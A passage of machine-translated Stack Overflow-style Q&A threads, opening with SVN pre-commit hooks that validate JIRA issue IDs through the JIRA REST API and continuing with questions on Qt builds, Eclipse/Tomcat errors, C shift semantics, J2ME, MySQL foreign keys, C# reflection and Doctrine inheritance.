使用 JIRA ReST API 检查 JIRA 中是否存在问题并不难。

在我们的例子中，我使用了该`pre-commit.tmpl`文件并在打开评论部分之后添加了以下内容：

```
REPOS="$1"
TXN="$2"

SVNLOOK=/usr/bin/svnlook
CURL=/usr/bin/curl
JIRAURL=http://our.jira.url:8080/rest/api/latest/issue

# Make sure that the log message contains some text.
LOGMSG=$($SVNLOOK log -t "$TXN" "$REPOS")
echo ${LOGMSG} | grep "[a-zA-Z0-9]" > /dev/null || exit 1

# check that log message starts with a JIRA ticket
# should have format 'FOO-123: my commit message' or 'FOO-123 my commit message'
JIRAID=$(expr "${LOGMSG}" : '^\([A-Z]*-[0-9]*\)[: ].*')
if [[ "$JIRAID" == "" ]]
then
  echo "No JIRA id found in log message \"${LOGMSG}\"" >&2
  echo "Please use log message of the form \"JIRA-ID: My message\"" >&2
  exit 1
fi

# check if JIRA issue exists
JIRAISSUE=$(${CURL} ${JIRAURL}/${JIRAID})
if [[ "${JIRAISSUE}" =~ "Issue Does Not Exist" ]]
then
  echo "The JIRA id ${JIRAID} was not found" >&2
  echo "Please use log message of the form \"JIRA-ID: My message\"" >&2
  exit 1
fi 
```

这要求消息的格式为“JIRA-id: text”或“JIRA-id test”。您可以使正则表达式更通用，以允许在文本中的任何位置使用 JIRA id。如果需要，您还可以添加检查`${JIRAISSUE}`以确保问题是开放的，但这似乎足以满足我们的目的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-08T13:24:42.227

我碰巧有一个包含这个（以及许多其他事情）的预提交钩子。

该钩子可通过[Git-Hub](https://github.com/qazwart/SVN-Precommit-Kitchen-Sink-Hook)获得。它不会验证 Jira ID 是否存在，但它可以验证提交消息中是否存在类似 Jira 的 ID。这通常足以确保开发人员将 Jira 票号添加到他们的提交消息中。有一个示例`control.ini`文件向您展示了如何在提交消息中检查*类似 Jira 的*票号。有效的提交消息的格式如下：

*   无：我修复了一个没有 Jira 票号的问题
*   FDS-1231：我修复了一张 Jira 票
*   FDS-1231、FDS-3232：我修复了几张 Jira 票

但是，比 pre-commit hook 更好的方法是改变工作场所的文化，让开发人员自然会将 Jira 票号放在提交消息中，并会自动给出更详细的提交消息。我发现使用像[Jenkins](http://jenkins-ci.org)这样的持续构建服务器可以做到这一点。

Jenkins 将在每次签入时自动构建您的代码。每个构建都会向您显示更改和提交注释。Jenkins 集成到 Jira 中，一键查看 Jira 信息。Jenkins 还将提交消息和构建 # 附加到 Jira 票证上，因此 QA 人员可以查看特定的 Jira 票证，并查看哪个构建修复了此票证。

突然，提交消息信息变得更加明显。开发人员和 QA 开始依赖它。不添加 Jira 票证的开发人员不会受到构建人员的追捕，而是受到他们的老板和其他开发人员的追捕。现在，发布良好的提交信息已成为该地方的*文化*。而且，这是一个比任何预提交钩子更好的执行器。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-08T13:08:59.930

Atlassian 提供了一个触发器脚本，可以为大多数常见的 VCS 系统（包括 SVN）执行此操作，以及一个 JIRA 插件，可让您定义在提交描述中查找的内容。请参阅[JIRA Commit Acceptance 插件页面](https://studio.plugins.atlassian.com/wiki/display/CMMT/JIRA+Commit+Acceptance)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-11-09T16:52:27.810

好吧，我创建了一个简单的 shell 脚本（预提交）钩子来验证 jira 问题密钥是否由正则表达式提供并调用 REST API 以保证服务器上存在问题

```
#!/bin/sh

REPOS="$1"
TXN="$2"

SVNLOOK=/usr/bin/svnlook
JIRAURL=http://myown.jira.server:8080/rest/api/latest/issue
CURL=/usr/bin/curl

LOGMSG=$($SVNLOOK log -t "$TXN" "$REPOS")

# check if any comment has supplied by the commiter
if [ -z "$LOGMSG" ]; then
echo "Your commit was blocked because it have no comments." 1>&2
exit 1
fi

#check minimum size of text
if [ ${#LOGMSG} -lt 20 ]; then
echo "Your Commit was blocked because the comments does not meet minimum length requirements (20 letters)." 1>&2
exit 1
fi

# get jira ID by regex
JIRAID=$(expr "$LOGMSG" : '^\([A-Z]*-[0-9]*\)[: ].*')

# Check if jira id was found. 
if [ -z "$JIRAID" ]; then
echo "No JIRA id found in log message \"$LOGMSG\"" 1>&2
echo "Please use log message of the form JIRA-ID: My message" 1>&2
exit 1
fi

# check if JIRA issue exists on the server
JSON_RETURN=$(${CURL} -s ${JIRAURL}/${JIRAID} -u username:password | grep -o "errorMessage")

if [ -n "$JSON_RETURN" ]; then
        echo "The specified Jira Issue \"$JIRAID\" was not found in Jira server." 1>&2
        echo "Please, verify the specified issue ID and try again!" 1>&2
        exit 1
fi 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-02-14T10:23:14.083

以下脚本添加了正则表达式来查找任何模式，如 abc-123 并检查它是否存在于 jira 中。任何类似的模式也可能出现在评论的任何地方，但存在一个成功的模式将允许提交 -

```
#!/usr/bin/perl -w

$STATUS="1";
$REPOS=$ARGV[0];
$TXN=$ARGV[1];

$SVNLOOK="/usr/bin/svnlook";
$CURL="/usr/bin/curl";

$JIRAURL="http://x.x.x.x/jira/rest/api/2/issue";

$LOGMSG = `$SVNLOOK log -t $TXN $REPOS`;

chomp ($LOGMSG);
print "--$LOGMSG--\n";

if ($LOGMSG !~ /[A-Za-z][A-Za-z]*-[0-9][0-9]*/ ) {
print STDERR "NO JIRA case Found in comment - $LOGMSG";
exit (1);
}
@ARRAY= split (' ',$LOGMSG);

foreach (@ARRAY){

next if ! /[A-Za-z][A-Za-z]*-[0-9][0-9]*/ ;
chop();

$JIRAISSUE = `$CURL $JIRAURL/$_`;
chop ($JIRAISSUE);
if ($JIRAISSUE =~ /Issue Does Not Exist/){
print STDERR "The JIRA id $_ was not found\n";
}else { exit (0) };
}
exit ($STATUS); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-08-26T08:16:17.530

[Commit Policy Plugin](https://marketplace.atlassian.com/plugins/com.midori.jira.plugin.jira-commit-policy-plugin)是一个相当新的 JIRA 插件来强制执行此操作。

与此处建议的其他解决方案不同，它**不仅验证提交消息中是否存在类似模式的问题键（如“FOO-123”），甚至可以将其与 JIRA 中的配置 JQL 查询匹配！**

例如，这允许检查提到的问题是否是：

*   当前 sprint 中正在进行的用户故事
*   针对下一个产品版本的未解决的错误或任务
*   分配给团队负责人的高优先级任务（在代码冻结期间）

除了检查上述问题外，它还可以验证：

*   提交者的身份（他在 JIRA 中吗？他在 JIRA 组中吗？）
*   更改的文件（仅提交图像？有没有，*.class，* .obj，*.tmp 文件？所有 *.PNG 都在 /images 目录中？）
*   提交消息（这是 10+ 个字符长，没有空格吗？它是否以 JIRA 键开头？）

确保您[查看文档](http://www.midori-global.com/products/jira-commit-policy-plugin/)并尝试一下。

*免责声明：我是开发此插件的开发人员。尽管如此，这是解决此问题的最佳解决方案。*

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-08T13:03:20.010

在预提交挂钩中使用简单的正则表达式之前，我已经看到了这一点。

从好的方面来说，它根本不需要检查 Jira，但这也意味着您可以在其中放入一些看起来像有效问题密钥的东西。

# c++ - Qt Makefile 找不到自己的目录

> ID：10499099
> 
> 赞同：0
> 
> 时间：2012-05-08T12:59:25.200
> 
> 标签：c++, qt, include, makefile, qmake

我已经使用 Git 下载了 GoldenDict 的源代码，并针对语言环境运行 lrelease。现在我有一个奇怪的问题，我得到这个 makefile 日志：

```
14:55:54: Running build steps for project goldendict...
14:55:54: Starting: "c:\qtsdk\desktop\qt\4.8.1\msvc2010\bin\qmake.exe" D:\GoldenDictSrc\goldendict\goldendict.pro -r -spec win32-msvc2010 "CONFIG+=release"
14:55:56: The process "c:\qtsdk\desktop\qt\4.8.1\msvc2010\bin\qmake.exe" exited normally.
14:55:56: Starting: "C:\QtSDK\QtCreator\bin\jom.exe" 
C:\QtSDK\QtCreator\bin\jom.exe -f Makefile.Release
Error: dependent 'folding.cc' does not exist.
jom 1.0.8 - empower your cores

jom: D:\GoldenDictSrc\goldendict-build-desktop-Qt_4_8_1_for_Desktop_-_MSVC2010__Qt_SDK__Release\Makefile [release] Error 2
14:55:56: The process "C:\QtSDK\QtCreator\bin\jom.exe" exited with code 2.
Error while building project goldendict (target: Desktop)
When executing build step 'Make' 
```

而文件 fold.cc 在 qmake 文件所在的同一目录中可用。我什至尝试将 fold.cc 的绝对路径添加到 qmake 文件中，但没有用。

我正在使用 QtCreator。

这可能是什么原因造成的？

感谢您的任何努力。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-05T16:56:23.690

I have the same problem, and narrowed it down to the fact that QT only supports 122 characters for the path+filename of all dependent files (#includes or .cpp files).

If the path (relative or otherwise) is 123 characters or more, qt gives this error.

Just shorten your folder names, or filename to get the full path+filename to 122 characters or less.

# eclipse - 如何在 Eclipse 中卸载 jar 文件？

> ID：10499102
> 
> 赞同：0
> 
> 时间：2012-05-08T12:59:40.527
> 
> 标签：eclipse, tomcat, maven

我有一个 Tomcat 问题，每次我尝试在 Eclipse Galileo 上为我的 Maven 项目设置新服务器时都会收到此错误：

```
java.lang.NoSuchMethodError: org.eclipse.wst.server.core.model.ServerBehaviourDelegate.getTempDirectory(Z)Lorg/eclipse/core/runtime/IPath;
    at org.eclipse.jst.server.tomcat.core.internal.TomcatServerBehaviour.getTempDirectory(TomcatServerBehaviour.java:620)
    at org.eclipse.jst.server.tomcat.core.internal.TomcatVersionHelper.getStandardBaseDirectory(TomcatVersionHelper.java:154)
    at org.eclipse.jst.server.tomcat.core.internal.Tomcat60Handler.getRuntimeBaseDirectory(Tomcat60Handler.java:113)
    at org.eclipse.jst.server.tomcat.core.internal.TomcatServer.getRuntimeBaseDirectory(TomcatServer.java:316)
    at org.eclipse.jst.server.tomcat.ui.internal.editor.ServerLocationEditorSection.initialize(ServerLocationEditorSection.java:399)
    at org.eclipse.jst.server.tomcat.ui.internal.editor.ServerLocationEditorSection.createSection(ServerLocationEditorSection.java:344)
    at org.eclipse.wst.server.ui.editor.ServerEditorPart.insertSections(ServerEditorPart.java:306)
    at org.eclipse.wst.server.ui.internal.editor.OverviewEditorPart.createPartControl(OverviewEditorPart.java:287)
    at org.eclipse.ui.part.MultiPageEditorPart.addPage(MultiPageEditorPart.java:242)
    at org.eclipse.ui.part.MultiPageEditorPart.addPage(MultiPageEditorPart.java:212)
    at org.eclipse.wst.server.ui.internal.editor.ServerEditor.createPages(ServerEditor.java:235)
    at org.eclipse.ui.part.MultiPageEditorPart.createPartControl(MultiPageEditorPart.java:357)
    at org.eclipse.ui.internal.EditorReference.createPartHelper(EditorReference.java:662)
    at org.eclipse.ui.internal.EditorReference.createPart(EditorReference.java:462)
    at org.eclipse.ui.internal.WorkbenchPartReference.getPart(WorkbenchPartReference.java:595)
    at org.eclipse.ui.internal.EditorReference.getEditor(EditorReference.java:286)
    at org.eclipse.ui.internal.EditorManager.findEditor(EditorManager.java:403)
    at org.eclipse.ui.internal.WorkbenchPage.busyOpenEditorBatched(WorkbenchPage.java:2799)
    at org.eclipse.ui.internal.WorkbenchPage.busyOpenEditor(WorkbenchPage.java:2762)
    at org.eclipse.ui.internal.WorkbenchPage.access$11(WorkbenchPage.java:2754)
    at org.eclipse.ui.internal.WorkbenchPage$10.run(WorkbenchPage.java:2705)
    at org.eclipse.swt.custom.BusyIndicator.showWhile(BusyIndicator.java:70)
    at org.eclipse.ui.internal.WorkbenchPage.openEditor(WorkbenchPage.java:2701)
    at org.eclipse.ui.internal.WorkbenchPage.openEditor(WorkbenchPage.java:2685)
    at org.eclipse.ui.internal.WorkbenchPage.openEditor(WorkbenchPage.java:2668)
    at org.eclipse.wst.server.ui.internal.ServerUIPlugin.editServer(ServerUIPlugin.java:425)
    at org.eclipse.wst.server.ui.internal.ServerUIPlugin.editServer(ServerUIPlugin.java:408)
    at org.eclipse.wst.server.ui.internal.cnf.ServerActionProvider$2.open(ServerActionProvider.java:90)
    at org.eclipse.jface.viewers.StructuredViewer$2.run(StructuredViewer.java:842)
    at org.eclipse.core.runtime.SafeRunner.run(SafeRunner.java:42)
    at org.eclipse.core.runtime.Platform.run(Platform.java:888)
    at org.eclipse.ui.internal.JFaceUtil$1.run(JFaceUtil.java:48)
    at org.eclipse.jface.util.SafeRunnable.run(SafeRunnable.java:175)
    at org.eclipse.jface.viewers.StructuredViewer.fireOpen(StructuredViewer.java:840)
    at org.eclipse.jface.viewers.StructuredViewer.handleOpen(StructuredViewer.java:1101)
    at org.eclipse.ui.navigator.CommonViewer.handleOpen(CommonViewer.java:467)
    at org.eclipse.jface.viewers.StructuredViewer$6.handleOpen(StructuredViewer.java:1205)
    at org.eclipse.jface.util.OpenStrategy.fireOpenEvent(OpenStrategy.java:264)
    at org.eclipse.jface.util.OpenStrategy.access$2(OpenStrategy.java:258)
    at org.eclipse.jface.util.OpenStrategy$1.handleEvent(OpenStrategy.java:298)
    at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
    at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1003)
    at org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:3910)
    at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3503)
    at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:2405)
    at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:2369)
    at org.eclipse.ui.internal.Workbench.access$4(Workbench.java:2221)
    at org.eclipse.ui.internal.Workbench$5.run(Workbench.java:500)
    at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
    at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:493)
    at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
    at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:113)
    at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:194)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
    at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:368)
    at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:559)
    at org.eclipse.equinox.launcher.Main.basicRun(Main.java:514)
    at org.eclipse.equinox.launcher.Main.run(Main.java:1311) 
```

[我在这里找到了这个解决方案，](https://stackoverflow.com/questions/4933893/tomcat-6-eclipse-galileo)但我不知道 .jar 卸载方法是什么意思......有人可以向我解释一下吗？我尝试使用 Galileo SR1 和 SR2 但仍然没有运气...... :( 无法让我的 Maven 项目工作......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T09:13:58.813

必须下载 Eclipse Galileo J2EE 版本。这有正确的 WTP 版本。

# c++ - 在 x86 机器上移动超过 32 位的 uint64_t 整数未定义行为？

> ID：10499104
> 
> 赞同：15
> 
> 时间：2012-05-08T12:59:57.377
> 
> 标签：c++, c, x86, bit-shift, uint64

经过艰苦的学习，我尝试在 x86 机器上将 a 左移到 32 位`long long`以上。我隐约记得在某处读过比 32 位机器移位运算符仅在前 32 位上工作但无法回忆来源。我想知道在 x86 机器上移动超过 32 位的 uint64_t 整数是否是未定义行为？`uint64_t``0`

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-08T13:15:31.613

标准说（n1570 中的 6.5.7）：

> 3 对每个操作数执行整数提升。结果的类型是提升的左操作数的类型。如果右操作数的值为负数或大于或等于提升的左操作数的宽度，则行为未定义。
> 
> 4 E1 << E2的结果是E1左移E2位；空出的位用零填充。如果 E1 具有无符号类型，则结果的值为 E1 × 2 ^(E2)，比结果类型中可表示的最大值多模一减少。如果 E1 有带符号类型和非负值，并且 E1 × 2 ^(E2)在结果类型中是可表示的，那么这就是结果值；否则，行为是未定义的。
> 
> 5 E1 >> E2 的结果是 E1 右移 E2 位位置。如果 E1 具有无符号类型或 E1 具有有符号类型和非负值，则结果的值是 E1 / 2 ^(E2)的商的整数部分。如果 E1 具有带符号类型和负值，则结果值是实现定义的。

移位`uint64_t`小于 64 位的距离完全由标准定义。

由于`long long`必须至少为 64 位`long long`，如果结果不溢出，则移位小于 64 位的值由非负值标准定义。

但是请注意，如果您编写适合 32 位的文字，例如`uint64_t s = 1 << 32`@drhirsch 推测的那样，您实际上并没有移动 64 位值，而是 32 位值。那是未定义的行为。

最常见的结果是移位`shift_distance % 32`或 0，具体取决于硬件的功能（假设编译器的编译时评估模拟硬件语义，而不是鼻恶魔。）

**用于在移位`1ULL < 63`**`unsigned long long` *之前*生成移位操作数。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-08T13:18:09.067

C 标准需要转换才能正常工作。特定的错误编译器可能具有您描述的缺陷，但这是错误的行为。

这是一个测试程序：

```
#include <stdio.h>
#include <inttypes.h>

int main(void)
{
    uint64_t x = 1;
    for (int i = 0; i < 64; i++)
        printf("%2d: 0x%.16" PRIX64 "\n", i, (x << i));
    return 0;
} 
```

这是运行 RHEL 5 和 GCC 4.1.2 的 i686 机器、x86/64 机器（也运行 RHEL 5 和 GCC 4.1.2）和 x86/64 Mac（运行 Mac OS X 10.7\. 3 与 GCC 4.7.0）。由于这是预期的结果，我的结论是在 32 位机器上没有必要的问题，并且 GCC 至少从 GCC 4.1.2 以来没有出现任何此类错误（并且可能从未出现过这样的错误）。

```
 0: 0x0000000000000001
 1: 0x0000000000000002
 2: 0x0000000000000004
 3: 0x0000000000000008
 4: 0x0000000000000010
 5: 0x0000000000000020
 6: 0x0000000000000040
 7: 0x0000000000000080
 8: 0x0000000000000100
 9: 0x0000000000000200
10: 0x0000000000000400
11: 0x0000000000000800
12: 0x0000000000001000
13: 0x0000000000002000
14: 0x0000000000004000
15: 0x0000000000008000
16: 0x0000000000010000
17: 0x0000000000020000
18: 0x0000000000040000
19: 0x0000000000080000
20: 0x0000000000100000
21: 0x0000000000200000
22: 0x0000000000400000
23: 0x0000000000800000
24: 0x0000000001000000
25: 0x0000000002000000
26: 0x0000000004000000
27: 0x0000000008000000
28: 0x0000000010000000
29: 0x0000000020000000
30: 0x0000000040000000
31: 0x0000000080000000
32: 0x0000000100000000
33: 0x0000000200000000
34: 0x0000000400000000
35: 0x0000000800000000
36: 0x0000001000000000
37: 0x0000002000000000
38: 0x0000004000000000
39: 0x0000008000000000
40: 0x0000010000000000
41: 0x0000020000000000
42: 0x0000040000000000
43: 0x0000080000000000
44: 0x0000100000000000
45: 0x0000200000000000
46: 0x0000400000000000
47: 0x0000800000000000
48: 0x0001000000000000
49: 0x0002000000000000
50: 0x0004000000000000
51: 0x0008000000000000
52: 0x0010000000000000
53: 0x0020000000000000
54: 0x0040000000000000
55: 0x0080000000000000
56: 0x0100000000000000
57: 0x0200000000000000
58: 0x0400000000000000
59: 0x0800000000000000
60: 0x1000000000000000
61: 0x2000000000000000
62: 0x4000000000000000
63: 0x8000000000000000 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-08T17:12:56.067

[Daniel Fischer 的回答](https://stackoverflow.com/a/10499371/9530)回答了有关 C 语言规范的问题。关于在 x86 机器上发出可变数量的班次时实际发生的情况，请参阅[英特尔软件开发人员手册](http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html)第 2B 卷，第 25 页。4-506：

> 计数被屏蔽为 5 位（如果在 64 位模式下使用 REX.W，则为 6 位）。计数范围限制为 0 到 31（如果使用 64 位模式和 REX.W，则为 63）。

因此，如果您尝试移动大于 31 或 63 的量（分别针对 32 位和 64 位值），硬件将仅使用移位量的底部 5 或 6 位。所以这段代码：

```
uint32_t RightShift(uint32_t value, uint32_t count)
{
    return value >> count;
} 
```

将导致在`RightShift(2, 33) == 1`x86 和 x86-64 上。根据 C 标准，它仍然是**未定义的行为**，但在 x86 上，如果编译器将其编译为`sar`指令，它将在该架构上定义行为。但是您仍然应该避免编写这种依赖于特定架构怪癖的代码。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-08T13:14:51.910

移动一个介于 0 和类型宽度的前一个之间的数字不会导致未定义的行为，但左移一个负数会。你会这样做吗？

另一方面，负数右移是实现定义的，并且大多数编译器在右移有符号类型时会传播符号位。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-08T13:20:39.567

不，没关系。

ISO 9899:2011 6.5.7 移位运算符

> **如果右操作数的**值为负数或**大于或等于**提升的左操作数的宽度，则**行为未定义**。

这里不是这种情况，所以一切都很好并且定义明确。

# java - 在 J2ME 中运行的第一个应用程序

> ID：10499105
> 
> 赞同：-4
> 
> 时间：2012-05-08T12:59:59.357
> 
> 标签：java, mobile, java-me

> **可能重复：**
> [J2me 检测到应用程序的首次启动](https://stackoverflow.com/questions/10480413/j2me-detecting-first-start-of-application)

我正在开发一个 J2ME 应用程序，我想知道它是否是第一次在设备中运行该应用程序以便能够向用户显示欢迎消息，否则用户将被直接带到主屏幕

如何做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:07:08.073

一个简单的解决方案...

当用户单击按钮关闭欢迎消息时，将文件写入磁盘。下次启动应用程序时，检查文件是否存在 - 如果存在，则用户已经看到欢迎屏幕。如果文件不存在，则未显示欢迎屏幕（即应用程序的首次运行）

与其问这样的问题，不如发布一些想法或代码，向我们展示您至少尝试过自己先做这件事。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-05-08T13:11:28.747

首次运行应用程序时，您可以显示欢迎消息，然后创建任何普通文件，如任何 .txt。使您的代码使得@startup 每次都会查看该文件是否存在。如果存在，则转到主屏幕 n 如果不存在，则显示欢迎消息并创建文件。

**编辑：** 同意Doctoror Drive。更丰富的数据存储方式是使用 Record Store。检查[这个](http://www.ibm.com/developerworks/library/wi-rms/)。

# mysql - 带有外键的 INSERT 语句

> ID：10499111
> 
> 赞同：1
> 
> 时间：2012-05-08T13:00:07.513
> 
> 标签：mysql

我正在尝试`INSERT`进入表格，但出现错误`Cannot add or update a child row: a foreign key contraint fails`。

正如错误所说，我有一个正在尝试更新的外键。

现在我正在使用一个简单`INSERT`的方法：

```
INSERT INTO tblTable1 (firstColumn, foreignKey) VALUES ('blabla', 1) 
```

`foreignKey`如果id 是 ，我该如何插入`tblTable2`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:13:37.307

您需要先将记录添加到父表，然后再添加子表。

[来自关于外键约束](http://dev.mysql.com/doc/refman/5.5/en/innodb-foreign-key-constraints.html)的 MySQL 文档：

> 如果父表中没有匹配的候选键值，则 InnoDB 拒绝任何尝试在子表中创建外键值的 INSERT 或 UPDATE 操作。

[这是有关如何使用外键约束](http://dev.mysql.com/doc/refman/5.0/en/example-foreign-keys.html)和示例的 MySQL 文档。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:04:23.410

首先在表 2 中插入应用外键约束的条目，然后在表 1 中添加运行插入查询。它会起作用的

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-08T13:02:22.147

你必须保持你的约束。您不能在相关表中添加没有合适值的记录！

# c# - 如何使用 appdomain 在任何 dll 中通过条目 Dll 执行任何方法？

> ID：10499113
> 
> 赞同：0
> 
> 时间：2012-05-08T13:00:09.910
> 
> 标签：c#, .net, oop, remoting

这是一个奇怪的问题。我可以从插件目录加载 15 个 Dll。但我有 basePluginToRunothers.DLL 哪个任务执行其他 14 个 dll。我的 Starter dll 是 basePluginToRunothers.DLL。如何在 AppDomain.CurrentDomain 中使用 basePluginToRunothers.DLL 运行其他 dll？

![在此处输入图像描述](../Images/1e28c50d17ffbefabbeaaaf91c36225a.png)

如何使用具有 RUN 方法的 basePluginToRunothers.DLL 来使用 abc.dll、xyz.dll、klm.dll？注意：可以加载所有 dll。其他 dll 将通过 basePluginToRunothers'run 方法执行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:42:34.733

```
public static void ReflectionInvoke()
        {
            int sum = 0;
            int sub = 0;
            int sum1 = 0;
            int sum2 = 0;
            MethodInfo mi = default(MethodInfo);

            // Loading the assembly 
            Assembly reflectionAssemby = Assembly.LoadFile(@"C:\RelectionDLL.dll");
            // Get type of class from loaded assembly
            Type reflectionClassType = reflectionAssemby.GetType("ReflectionDLL.ReflectionClass");
            // Create instance of the class
            object objReflection = Activator.CreateInstance(reflectionClassType);

            // Playing with property read/write
            PropertyInfo intPropInfo = reflectionClassType.GetProperty("intProperty");
            int i = Convert.ToInt32(intPropInfo.GetValue(objReflection, null));
            // Reading value
            intPropInfo.SetValue(objReflection, 55, null);
            // writing value
            int k = Convert.ToInt32(intPropInfo.GetValue(objReflection, null));
            // Reading value
            // Playing with property read
            PropertyInfo strPropInfo = reflectionClassType.GetProperty("strProperty");
            String str = (String)strPropInfo.GetValue(objReflection, null);
            // Reading value
            // Playing with property write
            PropertyInfo dtPropertyInfo = reflectionClassType.GetProperty("dtProperty");
            dtPropertyInfo.SetValue(objReflection, DateTime.Now, null);
            // writing value
            // Playing with static property read/write
            PropertyInfo staticPropertyInfo = reflectionClassType.GetProperty("staticProperty");
            int i1 = Convert.ToInt32(staticPropertyInfo.GetValue(null, null));
            // Reading value
            staticPropertyInfo.SetValue(null, 111, null);
            // writing value
            int k1 = Convert.ToInt32(staticPropertyInfo.GetValue(null, null));
            // Reading value
            // Invoking instance method
            //

            Console.WriteLine("IInd Way to call methods");
            reflectionClassType.InvokeMember("pub_Inst_NoReturn_Function", BindingFlags.InvokeMethod | BindingFlags.Instance | BindingFlags.Public, null, objReflection, null);
            reflectionClassType.InvokeMember("pri_Inst_NoReturn_Function", BindingFlags.InvokeMethod | BindingFlags.Instance | BindingFlags.NonPublic, null, objReflection, null);
            sum = Convert.ToInt32(reflectionClassType.InvokeMember("pub_inst_Add_TwoNos", BindingFlags.InvokeMethod | BindingFlags.Instance | BindingFlags.Public, null, objReflection, new object[] { 55, 56 }));
            sub = Convert.ToInt32(reflectionClassType.InvokeMember("pri_inst_Subtract_TwoNos", BindingFlags.InvokeMethod | BindingFlags.Instance | BindingFlags.NonPublic, null, objReflection, new object[] { 55, 56 }));

            // Invoking static method
            reflectionClassType.InvokeMember("pub_static_NoReturn_Function", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, null, null);
            reflectionClassType.InvokeMember("pri_static_NoReturn_Function", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.NonPublic, null, null, null);
            sum1 = Convert.ToInt32(reflectionClassType.InvokeMember("pub_static_Add_TwoNos", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public, null, null, new object[] { 55, 56 }));
            sum2 = Convert.ToInt32(reflectionClassType.InvokeMember("pri_static_Subtract_TwoNos", BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.NonPublic, null, null, new object[] { 55, 56 }));

            Console.WriteLine();
        } 
```

# symfony - 如何使用 Doctrine2 构建查询继承之类的东西？

> ID：10499115
> 
> 赞同：1
> 
> 时间：2012-05-08T13:00:17.313
> 
> 标签：symfony, doctrine-orm

我正在用 Symfony2 和 Doctrine2 构建一个小型网站。有博客文章、活动和新闻稿。它们中的每一个都非常相似，因此我决定将单表继承 (STI) 与称为“节点”的父表一起使用。

节点有：

*   一个“已发布”字段，它是布尔值
*   一个“语言环境”字段，它是一个字符串，表示“这只在这个语言环境中显示”。（语言环境是通过请求传入的）。

默认情况下，我只想显示来自当前语言环境的已发布节点。

显然，我可以在存储库中创建许多查询，如下所示：

```
$this->createQueryBuilder('Event')
     ->where('Node.published = 1')
     ->where('Node.locale = :locale') 
```

但这似乎不是很干燥。

那么如何构建一个默认查询，其他查询可以从中“继承”呢？这应该包括基于关系的默认 Doctrine 查询。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T20:39:56.873

继承可能是矫枉过正。

为什么不创建一个小工厂方法来为您提供预配置的 queryBuilder？

```
class NodeRepository extends Doctrine\ORM\EntityRepository {

    public function getLocalizedNodeQueryBuilder($type,$locale){
        return $this->getQueryBuilder($type)
            ->where('Node.published = 1')
            ->where('Node.locale = :locale')
            ->setParameter('locale',$locale);
    }
} 
```

您可以做同样的事情，如果您确定始终希望以这种方式配置查询构建器，则只需覆盖 getQueryBuilder。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:46:49.600

您不需要在存储库类中构建任何类似的东西。如果您使用“鉴别器映射”设置单表继承，您最终会得到单独的类（实体）。当 Doctrine 与 DBAL 交互时，它将按照您的“节点类型”进行过滤。

[http://docs.doctrine-project.org/projects/doctrine-orm/en/2.0.x/reference/inheritance-mapping.html#single-table-inheritance](http://docs.doctrine-project.org/projects/doctrine-orm/en/2.0.x/reference/inheritance-mapping.html#single-table-inheritance)

例如..

```
namespace MyProject\Model;

/**
 * @Entity
 * @InheritanceType("SINGLE_TABLE")
 * @DiscriminatorColumn(name="discr", type="string")
 * @DiscriminatorMap({"node" = "Node", "blogpost" = "Blogpost", "events" = "Events"})
 */
class Node
{
    // ...
}

/**
 * @Entity
 */
class Blogpost extends Node
{
    // ...
}

/**
 * @Entity
 */
class Events extends Node
{
    // ...
}

// get me all the blogposts
$blogposts = $em->getRepository('Blogpost')->findAll();

// get me all the events
$events = $em->getRepository('Events')->findAll(); 
```

这是特别有益的，因为您将能够将“博客帖子”逻辑封装到它自己的实体中，而不是试图用它的父类“节点”来表示它。

# php - 如何在 php 中使用 xml_file_open 将 sodipodi 作为属性传递？

> ID：10499121
